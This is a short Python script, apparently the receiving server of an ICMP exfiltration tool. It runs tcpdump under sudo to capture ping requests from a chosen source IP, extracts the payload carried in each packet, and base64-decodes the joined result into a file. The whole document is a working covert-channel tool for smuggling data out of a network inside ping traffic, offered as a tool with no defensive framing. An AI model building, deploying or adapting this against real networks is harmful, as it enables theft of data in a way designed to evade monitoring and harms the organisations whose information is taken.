import dpkt
import subprocess as s
import time as t
import base64 as b

print('\n**********************************')
print('*****ICMP*EXFILTRATION*SERVER*****')
print('**********************************\n')

captureInterface = input('Choose interface for tcpdump to capture (lo, eth0, wlan0, etc...): ')

print('\nHow many packets do you want to capture?')
numPackets = input('(Should be the same number the client will send: ')

filterIP = input('\nEnter source IP address for tcpdump filter: ')

print('\nOK.  Using interface ' + captureInterface + ' to capture ' + numPackets + ' ICMP packets from ' + filterIP + '...\n')

s.call(["sudo", "tcpdump", "-xvvvnni", captureInterface, "-s", "0", "-c", numPackets, "icmp[0] == 8", "&&", "src", filterIP, "-w", "icmp.pcap"])

print('\nPacket capture complete and saved to icmp.pcap...')
print('\nBeginning payload extraction to file \'icmp_encoded_output\'.')

#Open the pcap for reading
input=open('icmp.pcap','rb')

#This is where we concatenate and write all the extracted data
output=open('icmp_encoded_output', 'w')

pcap=dpkt.pcap.Reader(input)

#ts = timestamp of captured packet
#buf = packet data
for ts, buf in pcap:
    eth=dpkt.ethernet.Ethernet(buf)
    if (eth.type != 2048): # 2048 = (0x800) hex ethertype for IPv4
        continue

    ip=eth.data
    icmp=ip.data

    if (ip.p==dpkt.ip.IP_PROTO_ICMP) and len(icmp.data.data)>0:
        try:
            output.write((icmp.data.data).decode('utf-8'))
        except Exception as e:
            print('Error: ' + repr(e))
            continue

print ('\nPayload extraction complete...')

input.close()
output.close()

t.sleep(1)

print('\nDecoding data and writing to a file...')

t.sleep(1)

o = open('decoded_data', 'w')

with open('icmp_encoded_output','r') as f:
    o.write(b.b64decode(f.read()).decode('utf-8'))

print('\nFinished... Exiting...')
t.sleep(1)


